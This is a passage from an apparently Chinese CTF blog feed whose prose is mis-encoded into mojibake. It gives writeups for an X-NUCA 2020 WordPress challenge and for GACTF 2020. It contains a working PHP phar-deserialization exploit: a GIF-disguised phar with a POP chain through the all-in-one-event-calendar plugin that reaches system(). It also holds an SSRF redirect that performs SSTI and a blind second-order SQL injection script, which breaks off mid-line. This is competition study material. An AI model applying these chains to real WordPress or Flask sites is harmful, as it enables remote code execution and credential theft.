æ²¡æœ‰è®¾ç½®æˆåŠŸã€‚</p><p>å¼€å¯è°ƒè¯•è·Ÿä¸€ä¸‹æºç ï¼Œå‘ç° meta_input å‚æ•°è¢« ban æ‰äº†â€¦</p><p><code>wp-admin/includes/post.php</code>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_wp_get_allowed_postdata</span>(<span class="params"> $post_data = <span class="literal">null</span> </span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> ( <span class="keyword">empty</span>( $post_data ) ) &#123;</span><br><span class="line">$post_data = $_POST;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Pass through errors.</span></span><br><span class="line"><span class="keyword">if</span> ( is_wp_error( $post_data ) ) &#123;</span><br><span class="line"><span class="keyword">return</span> $post_data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> array_diff_key( $post_data, array_flip( <span class="keyword">array</span>( <span class="string">&#x27;meta_input&#x27;</span>, <span class="string">&#x27;guid&#x27;</span> ) ) );</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ³¨é‡Šä¸€ä¸‹è¿™ä¸ªè¿‡æ»¤ï¼Œå¯ä»¥çœ‹åˆ°æœ€ç»ˆç¡®å®æ˜¯å¯¹ meta_input å‚æ•°çš„å€¼è®¾ç½®äº† metaï¼š</p><p><code>wp-admin/includes/post.php</code>ï¼š</p><p><img src="/2020/12/08/2020-X-NUCA-FINAL/image-20201209084336190.png" alt="image-20201209084336190"></p><p>è¿™é‡Œå°è¯•äº†å¾ˆå¤šæ€è·¯å»ç»•è¿‡ï¼Œæ— æœï¼Œæ‰€ä»¥æ”¾å¼ƒäº†è¿™ä¸ªæ€è·¯â€¦</p><p>èµ›åé—®äº†ä¸‹å‡ºé¢˜å¸ˆå‚…ï¼Œç¡®å®æ˜¯åˆ©ç”¨è¿™ä¸ªæ¼æ´ã€‚sendmail å‡½æ•°æœ‰å†™æ—¥å¿—çš„æ“ä½œï¼Œé¢„æœŸè§£æ˜¯å†™å…¥æ–‡ä»¶ï¼Œç„¶å phar ååºåˆ—åŒ– getshellï¼Œå…³äºè¿™ä¸ªæ¼æ´å¦‚ä½•åˆ©ç”¨ï¼Œæ²¡æœ‰å…¬å¸ƒã€‚</p><h2 id="éé¢„æœŸè§£æ³•"><a href="#éé¢„æœŸè§£æ³•" class="headerlink" title="éé¢„æœŸè§£æ³•"></a>éé¢„æœŸè§£æ³•</h2><p>å‡ºé¢˜äººåœ¨æ–‡ä»¶ä¸Šä¼ å¤„åŠ äº†è¿‡æ»¤ï¼Œä¸å…è®¸å«æœ‰ phpï¼Œæ‰€ä»¥éœ€è¦åˆ©ç”¨ä¸Šè¿°æ¼æ´è¾¾åˆ°ä»»æ„æ–‡ä»¶å†™çš„ç›®çš„ã€‚ä½†æ˜¯èµ›åœºä¸Šå¤§å®¶å‡ ä¹éƒ½æ˜¯éé¢„æœŸã€‚</p><img src="/2020/12/08/2020-X-NUCA-FINAL/image-20201209085131068.png" alt="image-20201209085131068" style="zoom: 50%;"><p>å°† php éšä¾¿æ”¹æˆ  xxxï¼Œphar ååºåˆ—åŒ–åŒæ ·å¯ä»¥åˆ©ç”¨ã€‚</p><p>ä¸‹é¢å°±æ˜¯ç›¸åŒçš„æ€è·¯äº†ï¼Œååºåˆ—åŒ– getshellï¼Œå‚è€ƒè¿™ç¯‡ phar çš„ç»å…¸æ–‡ç« ï¼š<a href="https://paper.seebug.org/680/#31">https://paper.seebug.org/680/#31</a></p><p>pop é“¾ï¼Œæ²¡æœ‰äº† WooCommerce è¿™ä¸ªæ’ä»¶ï¼Œæ‰¾ä¸€ä¸ªä»£æ›¿çš„ï¼š</p><p> all-in-one-event-calendar æ’ä»¶ä¸­ <code>app/controller/shutdown.php</code>çš„<code>Ai1ec_Shutdown_Controller</code>ç±»ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// replace globals from our internal store</span></span><br><span class="line">    $restore = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_preserve <span class="keyword">as</span> $name =&gt; $class) &#123;</span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">            !<span class="keyword">isset</span>($GLOBALS[$name]) ||</span><br><span class="line">            !($GLOBALS[$name] <span class="keyword">instanceof</span> $class)</span><br><span class="line">        ) &#123;</span><br><span class="line">            $restore[$name] = <span class="literal">NULL</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>($GLOBALS[$name])) &#123;</span><br><span class="line">                $restore[$name] = $GLOBALS[$name];</span><br><span class="line">            &#125;</span><br><span class="line">            $GLOBALS[$name] = <span class="keyword">$this</span>-&gt;_restorables[$name];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æ„é€ ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Requests_Utility_FilteredIterator</span> <span class="keyword">extends</span> <span class="title">ArrayIterator</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $callback;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$data, $callback</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">parent</span>::__construct($data);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;callback = $callback;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ai1ec_Shutdown_Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $_callbacks;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_callbacks = <span class="keyword">new</span> Requests_Utility_FilteredIterator(<span class="keyword">array</span>(<span class="string">&#x27;id&#x27;</span>), <span class="string">&#x27;system&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?xxx __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//è®¾ç½®stub, å¢åŠ gifæ–‡ä»¶å¤´ï¼Œä¼ªé€ æ–‡ä»¶ç±»å‹</span></span><br><span class="line"><span class="comment">//$o = new WC_Log_Handler_File();</span></span><br><span class="line">$o = <span class="keyword">new</span> Ai1ec_Shutdown_Controller();</span><br><span class="line">$phar-&gt;setMetadata($o); <span class="comment">//å°†è‡ªå®šä¹‰meta-dataå­˜å…¥manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line"><span class="comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç°åœ¨éœ€è¦æ‰¾åˆ°è§¦å‘ç‚¹ï¼Œæ–‡ç« ä¸­çš„ rpc æ²¡æœ‰äº†ï¼Œéœ€è¦å†æ‰¾ã€‚</p><p>ç»§ç»­æ²¿ç€<code>wp_get_attachment_thumb_file</code>å‘å‰å¯»æ‰¾è°ƒç”¨ï¼Œå‘ç°<code>wp-includes/media.php</code> çš„<code>image_downsize</code>æ–¹æ³•ï¼š</p><p><img src="/2020/12/08/2020-X-NUCA-FINAL/image-20201209085624477.png" alt="image-20201209085624477"></p><p>å¯»æ‰¾è°ƒç”¨ï¼Œ<code>wp-include/media.php</code>ï¼š</p><p><img src="/2020/12/08/2020-X-NUCA-FINAL/image-20201209085643919.png" alt="image-20201209085643919"></p><p>è¿™é‡Œé˜Ÿå‹ç›´æ¥åœ¨å‡ ä¸ªè°ƒç”¨å¤„éƒ½ä¸‹æ–­ç‚¹ï¼Œç„¶ååœ¨ media å¤„éšä¾¿ç‚¹å‡»ï¼Œçœ‹å“ªé‡Œå¯ä»¥æ–­ã€‚æœ€åå‘ç°æ–°å»ºä¸€ç¯‡æ–‡ç« ï¼Œå¹¶æ·»åŠ  mediaï¼Œå¯ä»¥è§¦å‘åˆ° image_downsize å‡½æ•°ã€‚è°ƒç”¨æ ˆå¦‚ä¸‹ï¼š</p><p><img src="/2020/12/08/2020-X-NUCA-FINAL/image-20201209085849053.png" alt="image-20201209085849053"></p><p>åé¢<code>$file</code>ä¸ <code>$imagedata[&#39;thumb&#39;]</code>å‚è€ƒåŸæ¥é‚£ç¯‡æ–‡ç« ï¼Œå®é™…åˆ©ç”¨èµ·æ¥å…¶å®æŒºéº»çƒ¦çš„ã€‚</p><p>é¦–å…ˆæ³¨å†Œä¸ªè´¦æˆ·ï¼Œåœ¨ /wp-admin ä¸‹ï¼Œä¼ ä¸€ä¸ª mediaï¼ˆ phar æ„é€ å‡ºçš„ï¼‰ã€‚</p><p><img src="/2020/12/08/2020-X-NUCA-FINAL/image-20201209090350107.png" alt="image-20201209090350107"></p><p>ä¿å­˜åœ¨äº† <code>wp-content/uploads/2020/12/phar.gif</code>ã€‚</p><p>ç„¶åæˆ‘ä»¬éœ€è¦æ§åˆ¶è¿™ä¸ª media çš„<code>$file</code>ä¸ <code>$imagedata[&#39;thumb&#39;]</code>ï¼Œå‚è€ƒæ–‡ç« çš„æ‰“æ³•ã€‚æ‰“å¼€ç¼–è¾‘è¿™ä¸ª media çš„é¡µé¢ï¼Œæˆ‘çš„ç½‘å€æ˜¯ <code>http://192.168.43.44/wp-admin/post.php?post=68&amp;action=edit</code>ã€‚å¯ä»¥çœ‹åˆ° post_id æ˜¯ 68 ã€‚ç„¶åè·å– wp_nonceï¼Œå‘åŒ…ã€‚</p><p>æ§åˆ¶<code>$file</code>ï¼šï¼ˆéœ€è¦ä¿®æ”¹_wpnonceä¸post_IDï¼‰</p><p><img src="/2020/12/08/2020-X-NUCA-FINAL/image-20201209090459620.png" alt="image-20201209090459620"></p><p>æ§åˆ¶ <code>$imagedata[&#39;thumb&#39;]</code>ï¼šï¼ˆéœ€è¦ä¿®æ”¹ _wpnonceï¼Œpost_ID ä¸ thumbï¼‰</p><p><img src="/2020/12/08/2020-X-NUCA-FINAL/image-20201209090542718.png" alt="image-20201209090542718"></p><p>ç„¶åè§¦å‘ååºåˆ—åŒ–ï¼Œæ–°å»ºä¸€ç¯‡æ–‡ç« ï¼Œæ·»åŠ  mediaï¼š</p><p><img src="/2020/12/08/2020-X-NUCA-FINAL/image-20201209090549933.png" alt="image-20201209090549933"></p><p>ç‚¹å‡»insertï¼ŒæŠ“åŒ…ã€‚ä¿®æ”¹ <code>attachment[image-size]=thumbnail</code>ï¼Œè¿™æ ·æ‰èƒ½è¿›åˆ°<code>wp_get_attachment_thumb_file</code>ä¸­ã€‚</p><p><img src="/2020/12/08/2020-X-NUCA-FINAL/image-20201209090559959.png" alt="image-20201209090559959"></p><p><img src="/2020/12/08/2020-X-NUCA-FINAL/image-20201209090603399.png" alt="image-20201209090603399"></p><p>å¦ä¸€æ¡è§¦å‘é“¾ï¼Œå½“æ—¶åšé¢˜æ—¶ä¹Ÿçœ‹åˆ°äº†ï¼Œåé¢æ²¡å»è°ƒé‚£ä¸ªï¼Œåº”è¯¥ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚</p><p>ä¹Ÿæ˜¯å¯»æ‰¾è°ƒç”¨ image_downsizeï¼Œåœ¨ <code>wp-admin/includes/media.php</code>çš„<code>image_size_input_fields</code>å‡½æ•°ï¼š</p><p><img src="/2020/12/08/2020-X-NUCA-FINAL/image-20201209091547264.png" alt="image-20201209091547264"></p><p>ç»§ç»­å‘å‰æ‰¾è°ƒç”¨ï¼Œä¾æ¬¡æ˜¯<code>wp-admin/includes/media.php</code>ä¸­çš„ <code>get_attachment_fields_to_edit</code>å‡½æ•°ã€<code>get_media_item</code>å‡½æ•°ï¼Œæœ€å<code>wp-admin/async-upload.php</code>ä¸­è°ƒç”¨äº† <code>get_media_item</code>å‡½æ•°ã€‚</p><p>æ‰€ä»¥è§¦å‘é“¾æ˜¯ <code>get_media_item</code>  -&gt; <code>get_attachment_fields_to_edit</code> -&gt; <code>image_size_input_fields</code> -&gt; <code>image_downsize</code> -&gt;  <code>wp_get_attachment_thumb_file</code>ã€‚</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;å¾€å¹´å¬è¯´ X-NUCA å†³èµ›æœ‰æ¸—é€ï¼Œæƒ³ç€æ¥è¡¥è¡¥æ¸—é€ï¼Œç»“æœä»Šå¹´æ²¡æœ‰äº†â€¦ åªæœ‰ä¸€é“ Webï¼Œç±»ä¼¼è§£é¢˜ï¼Œæäº¤ flag æ¯è½®è‡ªåŠ¨å¾—åˆ†ï¼Œæ²¡æœ‰é˜²å¾¡æ¦‚å¿µã€‚&lt;/p&gt;
&lt;p&gt;é¢˜ç›®åŸºäº Wordpress 5.5.3 æœ€æ–°ç‰ˆæœ¬è¿›è¡Œäº†ä¸€äº›æ”¹åŠ¨ï¼Œå¹¶æ·»åŠ äº†å‡ ä¸ªæ’ä»¶ã€‚æ‹¿åˆ°æºç å…ˆ diff ä¸€ä¸‹ï¼Œå‘ç° wordpress éƒ¨åˆ†æœ‰å‡ å¤„å°çš„æ”¹åŠ¨ï¼Œå…¶ä¸­å¢åŠ äº†å¯¹æ–‡ä»¶ä¸Šä¼ çš„ä¸€ä¸ªè¿‡æ»¤ï¼š&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://igml.top/categories/CTF/"/>
    
    <category term="Web" scheme="https://igml.top/categories/CTF/Web/"/>
    
    
    <category term="CTF" scheme="https://igml.top/tags/CTF/"/>
    
    <category term="Web" scheme="https://igml.top/tags/Web/"/>
    
    <category term="Wordpress" scheme="https://igml.top/tags/Wordpress/"/>
    
  </entry>
  
  <entry>
    <title>2020 GACTF writeup</title>
    <link href="https://igml.top/2020/08/31/2020-GACTF/"/>
    <id>https://igml.top/2020/08/31/2020-GACTF/</id>
    <published>2020-08-31T06:22:46.000Z</published>
    <updated>2020-09-01T01:47:15.373Z</updated>
    
    <content type="html"><![CDATA[<p>Web ä¸ Crypto å¤§éƒ¨åˆ†é¢˜ç›®éš¾åº¦ä¸å¤§ï¼Œæ•´ç†ä¸‹é¢˜è§£ã€‚</p><a id="more"></a><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="XWiki"><a href="#XWiki" class="headerlink" title="XWiki"></a>XWiki</h3><p>CVE 2020-11057ï¼Œå‚è€ƒ<a href="https://jira.xwiki.org/browse/XWIKI-16960">https://jira.xwiki.org/browse/XWIKI-16960</a>ï¼Œå¯ä»¥ç›´æ¥æ‰§è¡ŒPythonä»£ç ã€‚å‘ç°æ ¹ç›®å½•ä¸‹ /readflagï¼Œè¦å›ç­”ä¸¤ä¸ªæ•°å“ªä¸ªå¤§ï¼Œè¾“å…¥0æˆ–è€…1ã€‚æ‹–ä¸‹æ¥é€†å‘ï¼Œå†™ä¸ªè„šæœ¬è‡ªåŠ¨äº¤äº’ï¼ˆé¢˜ç›®ç¯å¢ƒé‡Œæ‹‰çš„233ï¼‰ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> Popen, PIPE</span><br><span class="line">p = Popen(<span class="string">&#x27;./readflag&#x27;</span>, stdin=PIPE, stdout=PIPE)</span><br><span class="line">t = p.stdout.readline().strip()</span><br><span class="line">t = p.stdout.readline().strip()</span><br><span class="line">t = p.stdout.readline().strip().decode()</span><br><span class="line">f = <span class="string">&#x27;&#x27;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">464</span>):</span><br><span class="line">data = t.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">int</span>(data[<span class="number">5</span>]) &gt; <span class="built_in">int</span>(data[<span class="number">7</span>])):</span><br><span class="line">p.stdin.write(<span class="string">b&quot;0\n&quot;</span>)</span><br><span class="line">flag+=<span class="string">&quot;0&quot;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p.stdin.write(<span class="string">b&quot;1\n&quot;</span>)</span><br><span class="line">flag+=<span class="string">&quot;1&quot;</span></span><br><span class="line"></span><br><span class="line">t = p.stdout.readline().decode()</span><br><span class="line">print(t)</span><br><span class="line">f += t</span><br><span class="line">print(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æŠŠ 01 æµè½¬æˆflagï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">&quot;01100111011000010110001101110100011001100111101101011000010101110110100101101011011010010101111101000011010101100100010101011111011101110110100101110100011010000110111101110101011101000101111101110000011001010111001001101101011010010111001101110011011010010110111101101110010111110111001101100011011100100110100101110000011101000110100101101110011001110101111101100101011110000110010101100011011101010111010001101001011011110110111000100001001000010010000101111101&quot;</span></span><br><span class="line"><span class="built_in">print</span> long_to_bytes(<span class="built_in">int</span>(flag,<span class="number">2</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="simpleflask"><a href="#simpleflask" class="headerlink" title="simpleflask"></a>simpleflask</h3><p><img src="/2020/08/31/2020-GACTF/image-20200831143516520.png" alt="image-20200831143516520"></p><h3 id="EZFLASK"><a href="#EZFLASK" class="headerlink" title="EZFLASK"></a>EZFLASK</h3><p><code>ctf.__globals__</code>ï¼Œå¯ä»¥å‘ç°adminçš„è·¯ç”±ï¼Œçœ‹èµ·æ¥æ˜¯ä¸ªssrfï¼Œä½†æ˜¯banæ‰äº† 127.0.0.1ã€‚</p><p><img src="/2020/08/31/2020-GACTF/image-20200831143707256.png" alt="image-20200831143707256"></p><p>5000ç«¯å£ï¼Œåº”è¯¥æ˜¯è¦ssrfæœ¬åœ°çš„5000ç«¯å£æœåŠ¡ã€‚</p><p>å‰é¢å¯ä»¥å‘ç°æ˜¯ requestsï¼Œå°è¯• 302 è·³è½¬ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Location: http://127.0.0.1:5000/&#x27;</span>);</span><br></pre></td></tr></table></figure><p>å‘ç°æœ‰sstiï¼Œç›´æ¥æ„é€ ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Location: http://127.0.0.1:5000/&#123;&#123;config&#125;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure><p><img src="/2020/08/31/2020-GACTF/image-20200831143901156.png" alt="image-20200831143901156"></p><h3 id="carefuleyes"><a href="#carefuleyes" class="headerlink" title="carefuleyes"></a>carefuleyes</h3><p><a href="http://www.zip">www.zip</a> æºç å®¡è®¡ã€‚</p><p>æˆ‘ä»¬ç›®æ ‡æ˜¯è°ƒç”¨XCTFGGçš„loginæ–¹æ³•ï¼ŒæˆåŠŸç™»é™†adminï¼š</p><p><img src="/2020/08/31/2020-GACTF/image-20200831144039840.png" alt="image-20200831144039840"></p><p>æœ‰ä¸ªååºåˆ—åŒ–å¯ä»¥å®Œæˆloginæ–¹æ³•è°ƒç”¨ï¼Œç°åœ¨é—®é¢˜æ˜¯å¦‚ä½•è·å–æƒé™æ˜¯adminçš„ç”¨æˆ·åå’Œå¯†ç ã€‚</p><p>å¯ä»¥çœ‹åˆ° sql æ–‡ä»¶ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">DATABASE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> <span class="string">`un`</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> un;</span><br><span class="line"><span class="keyword">USE</span> un;</span><br><span class="line"></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> <span class="string">`file`</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`file`</span> (</span><br><span class="line">  <span class="string">`fid`</span> <span class="built_in">int</span>(<span class="number">10</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  <span class="string">`filename`</span> <span class="built_in">varchar</span>(<span class="number">256</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`oldname`</span> <span class="built_in">varchar</span>(<span class="number">256</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`view`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`extension`</span> <span class="built_in">varchar</span>(<span class="number">32</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  PRIMARY <span class="keyword">KEY</span> (<span class="string">`fid`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> AUTO_INCREMENT=<span class="number">11</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8;</span><br><span class="line"></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> <span class="string">`user`</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`user`</span> (</span><br><span class="line">  <span class="string">`username`</span> <span class="built_in">varchar</span>(<span class="number">12</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`password`</span> <span class="built_in">varchar</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`privilege`</span> <span class="built_in">varchar</span>(<span class="number">8</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  PRIMARY <span class="keyword">KEY</span> (<span class="string">`username`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> AUTO_INCREMENT=<span class="number">11</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8;</span><br><span class="line"></span><br><span class="line"><span class="comment"># INSERT INTO user VALUES (&#x27;XM&#x27;, $db_pass, &#x27;admin&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SET</span> FOREIGN_KEY_CHECKS = <span class="number">1</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ’å…¥äº†ä¸€ä¸ªusernameä¸ºXMçš„ç”¨æˆ·ï¼Œå¯†ç æœªçŸ¥ï¼Œæˆ‘ä»¬éœ€è¦æ³¨å…¥å‡ºå¯†ç ã€‚</p><p>å®¡è®¡ä¸€ä¸‹å‘ç°å‡ ä¹æ‰€æœ‰ç›´æ¥å…¥åº“çš„æ“ä½œå‰éƒ½æœ‰è½¬ä¹‰æ“ä½œï¼Œå°è¯•å¯»æ‰¾äºŒæ¬¡æ³¨å…¥ï¼Œåœ¨rename.phpä¸­ï¼š</p><p><img src="/2020/08/31/2020-GACTF/image-20200831144324731.png" alt="image-20200831144324731"></p><p>æŸ¥è¯¢å‡ºæ¥çš„ç»“æœç›´æ¥æ‹¼æ¥åˆ°äº†æŸ¥è¯¢è¯­å¥ä¸­ï¼Œå­˜åœ¨äºŒæ¬¡æ³¨å…¥ã€‚</p><p>å†™ä¸ªç›²æ³¨è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    data = <span class="string">&quot;&quot;</span></span><br><span class="line">    session = requests.Session()</span><br><span class="line">    <span class="built_in">list</span> = <span class="built_in">map</span>(<span class="built_in">ord</span>,string.printable)</span><br><span class="line">    payload = <span class="string">&#x27;(select ascii(substr(password,&#123;mid&#125;,1)) from user)=&#123;value&#125;&#x27;</span></span><br><span class="line">    filename = <span class="string">&quot;gml&#x27;and &#123;sql&#125;#&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">        flag = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">            sql = payload.<span class="built_in">format</span>(mid=i,value=j)</span><br><span class="line">            name = filename.<span class="built_in">format</span>(sql=sql)</span><br><span class="line">            <span class="comment"># print name</span></span><br><span class="line">            paramsMultipart = [(<span class="string">&#x27;upfile&#x27;</span>, (<span class="string">&quot;%s.txt&quot;</span>%name, <span class="string">&quot;gml\n&quot;</span>, <span class="string">&#x27;application/octet-stream&#x27;</span>))]</span><br><span class="line">            headers = &#123;<span class="string">&quot;Origin&quot;</span>: <span 